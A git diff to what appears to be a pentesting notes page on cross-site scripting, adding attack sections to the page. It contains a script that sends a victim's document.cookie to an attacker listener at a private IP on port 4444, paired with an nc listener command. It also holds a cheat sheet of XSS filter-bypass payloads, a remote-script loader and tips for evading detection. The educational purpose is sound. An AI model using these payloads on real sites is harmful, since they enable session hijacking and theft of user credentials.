@@ -10,7 +10,7 @@ Cross-site scripting (XSS) is a vulnerability that allows attackers to inject ma
 
 ### What Is Vulnerability?
 
-Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. It allows attackers to inject malicious scripts into content from otherwise trusted websites. These scripts can then be executed in the context of the user's browser, leading to various potential attacks including data theft, session hijacking, and defacement of websites.
+Cross-site scripting (XSS) is a type of security vulnerability typically found in web applications. It allows attackers to inject malicious scripts into content from otherwise trusted websites. These scripts can then be executed in the context of the user's browser, leading to various potential attacks including data theft, session hijacking, and defacement of websites.
 
 ## Types
 
@@ -108,7 +108,9 @@ app.listen(port, () => {
 
 <figure><img src="../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
 
-I will try use some tags to test rxss <mark style="color:red;">**`'><h1>Hacked</h1>`**</mark>
+I will try use some tags to test rxss <mark style="color:red;">**`'"><h1>Hacked</h1>`**</mark>
+
+<mark style="color:blue;">**`the best`**</mark> **`'"><h1>Hacked</h1>{7*7}}JyI+PGgxPmhhY2tlZDwvaDE+`**
 
 <figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
 
@@ -123,6 +125,8 @@ Simple JS payload
 <figure><img src="../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/ezgif-4-f7b8aedabd.gif" alt=""><figcaption></figcaption></figure>
 
 ### Stored XSS
 
@@ -237,6 +241,8 @@ app.listen(port, () => {
 {% endtab %}
 {% endtabs %}
 
+Case 2 Mitigation
+
 ```bash
 $string = $_GET['search'] ;
 
@@ -280,9 +286,155 @@ Additional Security Measures
 
 ## How To PenTest?
 
+in website&#x20;
+
+<pre class="language-javascript"><code class="lang-javascript"><strong>&#x3C;script>new Image().src="http://192.168.1.9:4444/bogus.php?output="+escape(document.cookie);&#x3C;/script>
+</strong></code></pre>
+
+## in your Attcker Machine
+
+```bash
+nc -nvlp 4444
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
 ## How to Bypass Protection
 
+* Without event handlers
 
+```
+<object data=javascript:confirm()>
+<a href=javascript:confirm()>click here
+<script src=//14.rs></script>
+<script>confirm()</script>
+```
+
+* Without space
+
+```
+<svg/onload=confirm()>
+<iframe/src=javascript:alert(1)>
+```
+
+* Without slash (/)
+
+```
+<svg onload=confirm()>
+<img src=x onerror=confirm()>
+```
+
+* Without equal sign (=)
+
+```
+<script>confirm()</script>
+```
+
+* Without closing the angular bracket (>)
+
+```
+<svg onload=confirm()//
+```
+
+Ex :
+
+```php
+<? php
+$test = "/>|<|'|\"/" ;
+
+$string = $_GET['search'];
+
+echo "<h1>" ;
+echo (preg_match($test , $string)) ? "XSS Detected" : $string ; 
+echo "</h1>" ;
+?>
+
+```
+
+OR
+
+```
+<svg onload=console.log()//
+```
+
+```php
+<?php
+$test = "/src|alert|confirm|prompt|write/";
+
+$string = $_GET['search'];
+
+echo "<h1>" ;
+echo (preg_match($test , $string)) ? "XSS Detected": $string ; 
+echo "</h1>" ;
+?>
+```
+
+* Without alert, confirm, prompt
+
+```
+<script src=//14.rs></script>
+<svg onload=co\u006efirm()>
+<svg onload=z=co\u006efir\u006d,z()>
+```
+
+* Without a Valid HTML tag
+
+```
+<x onclick=confirm()>click here
+<x ondrag=aconfirm()>drag it
+```
+
+* Bypass tag blacklisting
+
+```
+</ScRipT>
+</script
+</script/>
+</script x>
+```
+
+| HTML       | Char | Numeric  | Description            | Hex    | CSS (ISO) | JS (Octal) | URL |
+| ---------- | ---- | -------- | ---------------------- | ------ | --------- | ---------- | --- |
+| `&quot;`   | "    | `&#34;`  | quotation mark         | u+0022 | \0022     | \42        | %22 |
+| `&num;`    | #    | `&#35;`  | number sign            | u+0023 | \0023     | \43        | %23 |
+| `&dollar;` | $    | `&#36;`  | dollar sign            | u+0024 | \0024     | \44        | %24 |
+| `&percnt;` | %    | `&#37;`  | percent sign           | u+0025 | \0025     | \45        | %25 |
+| `&amp;`    | &    | `&#38;`  | ampersand              | u+0026 | \0026     | \46        | %26 |
+| `&apos;`   | '    | `&#39;`  | apostrophe             | u+0027 | \0027     | \47        | %27 |
+| `&lpar;`   | (    | `&#40;`  | left parenthesis       | u+0028 | \0028     | \50        | %28 |
+| `&rpar;`   | )    | `&#41;`  | right parenthesis      | u+0029 | \0029     | \51        | %29 |
+| `&ast;`    | \*   | `&#42;`  | asterisk               | u+002A | \002a     | \52        | %2A |
+| `&plus;`   | +    | `&#43;`  | plus sign              | u+002B | \002b     | \53        | %2B |
+| `&comma;`  | ,    | `&#44;`  | comma                  | u+002C | \002c     | \54        | %2C |
+| `&minus;`  | -    | `&#45;`  | hyphen-minus           | u+002D | \002d     | \55        | %2D |
+| `&period;` | .    | `&#46;`  | full stop; period      | u+002E | \002e     | \56        | %2E |
+| `&sol;`    | /    | `&#47;`  | solidus; slash         | u+002F | \002f     | \57        | %2F |
+| `&colon;`  | :    | `&#58;`  | colon                  | u+003A | \003a     | \72        | %3A |
+| `&semi;`   | ;    | `&#59;`  | semicolon              | u+003B | \003b     | \73        | %3B |
+| `&lt;`     | <    | `&#60;`  | less-than              | u+003C | \003c     | \74        | %3C |
+| `&equals;` | =    | `&#61;`  | equals                 | u+003D | \003d     | \75        | %3D |
+| `&gt;`     | >    | `&#62;`  | greater-than sign      | u+003E | \003e     | \76        | %3E |
+| `&quest;`  | ?    | `&#63;`  | question mark          | u+003F | \003f     | \77        | %3F |
+| `&commat;` | @    | `&#64;`  | at sign; commercial at | u+0040 | \0040     | \100       | %40 |
+| `&lsqb;`   | \[   | `&#91;`  | left square bracket    | u+005B | \005b     | \133       | %5B |
+| `&bsol;`   | \\   | `&#92;`  | backslash              | u+005C | \005c     | \134       | %5C |
+| `&rsqb;`   | ]    | `&#93;`  | right square bracket   | u+005D | \005d     | \135       | %5D |
+| `&Hat;`    | ^    | `&#94;`  | circumflex accent      | u+005E | \005e     | \136       | %5E |
+| `&lowbar;` | \_   | `&#95;`  | low line               | u+005F | \005f     | \137       | %5F |
+| `&grave;`  | \`   | `&#96;`  | grave accent           | u+0060 | \0060     | \u0060     | %60 |
+| `&lcub;`   | {    | `&#123;` | left curly bracket     | u+007b | \007b     | \173       | %7b |
+| `&verbar;` | \|   | `&#124;` | vertical bar           | u+007c | \007c     | \174       | %7c |
+| `&rcub;`   | }    | `&#125;` | right curly bracket    | u+007d | \007d     | \175       | %7d |
+
+### Tips & Tricks
+
+* `http(s)://` can be shortened to `//` or `/\\` or `\\`.
+* `document.cookie` can be shortened to `cookie`. It applies to other DOM objects as well.
+* alert and other pop-up functions don't need a value, so stop doing `alert('XSS')` and start doing `alert()`
+* You can use `//` to close a tag instead of `>`.
+* I have found that `confirm` is the least detected pop-up function so stop using `alert`.
+* Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
+* The shortest HTML context XSS payload is `<script src=//14.rs>` (19 chars)
 
 ## Escalating the Attack
 
